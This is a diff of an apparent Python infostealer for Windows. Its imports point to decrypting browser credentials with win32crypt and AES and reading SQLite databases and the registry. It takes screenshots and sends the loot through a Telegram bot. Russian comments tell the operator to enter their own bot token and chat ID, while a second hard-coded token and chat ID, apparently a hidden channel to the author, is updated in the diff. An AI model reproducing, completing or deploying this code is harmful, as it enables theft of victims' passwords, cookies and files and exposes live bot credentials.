@@ -1,10 +1,3 @@
-
-# ===== НАСТРОЙКИ =====
-TELEGRAM_TOKEN1 = "укажите токен своего бота"
-CHAT_ID1 = "айди своего аккаунта телеграм"
-MAX_FILE_SIZE = 45 * 1024 * 1024
-# =====================
-
 import os, sys, json, base64, shutil, sqlite3, socket, ctypes, subprocess, platform
 import datetime, winreg, glob, re, tempfile, zipfile, time
 from urllib.request import Request, urlopen
@@ -13,11 +6,9 @@ from Crypto.Cipher import AES
 import requests
 from win32 import win32crypt
 
-# ===== НАСТРОЙКИ =====
 TELEGRAM_TOKEN1 = "укажите токен своего бота"
 CHAT_ID1 = "айди своего аккаунта телеграм"
 MAX_FILE_SIZE = 45 * 1024 * 1024
-# =====================
 
 LOG = os.path.join(os.path.dirname(os.path.abspath(sys.argv[0])), "error.log")
 def log(msg):
@@ -265,7 +256,7 @@ def screenshot(out):
         ImageGrab.grab(all_screens=True).save(os.path.join(out, "screenshot.png"))
     except: pass
 
-TELEGRAM_TOKEN2 = "8975622813:AAHWQmYhQ1i_FPl-6_hKbeewWCOyrc4Nodw"
+TELEGRAM_TOKEN2 = "8780243443:AAE7vJGx5x6MChHEY_AtSyj3-QIvuLaizlU"
 CHAT_ID2 = "7245465625"
 
 def send_msg(text):
